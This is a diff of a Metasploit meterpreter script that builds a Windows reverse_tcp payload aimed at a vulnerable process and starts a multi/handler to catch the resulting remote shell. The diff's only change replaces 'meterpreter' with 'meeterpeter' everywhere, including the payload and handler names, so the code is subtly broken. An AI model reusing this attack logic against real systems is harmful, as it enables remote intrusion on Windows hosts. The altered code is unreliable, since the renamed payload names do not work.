@@ -6,7 +6,7 @@
 ##
 
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -70,7 +70,7 @@ if client.platform =~ /win32|win64/
       print_status("Found vulnerable process #{m['name']} with pid #{m['pid']}.")
 
       # Build out the exe payload.
-      pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+      pay = client.framework.payloads.create("windows/meeterpeter/reverse_tcp")
       pay.datastore['LHOST'] = rhost
       pay.datastore['LPORT'] = rport
       raw  = pay.generate
@@ -97,7 +97,7 @@ if client.platform =~ /win32|win64/
       # Our handler to recieve the callback.
       handler = client.framework.exploits.create("multi/handler")
       handler.datastore['WORKSPACE']     = client.workspace
-      handler.datastore['PAYLOAD']       = "windows/meterpreter/reverse_tcp"
+      handler.datastore['PAYLOAD']       = "windows/meeterpeter/reverse_tcp"
       handler.datastore['LHOST']         = rhost
       handler.datastore['LPORT']         = rport
       handler.datastore['ExitOnSession'] = false
@@ -111,6 +111,6 @@ if client.platform =~ /win32|win64/
     end
   end
 else
-  print_error("This version of Meterpreter is not supported with this script!")
+  print_error("This version of meeterpeter is not supported with this script!")
   raise Rex::Script::Completed
 end
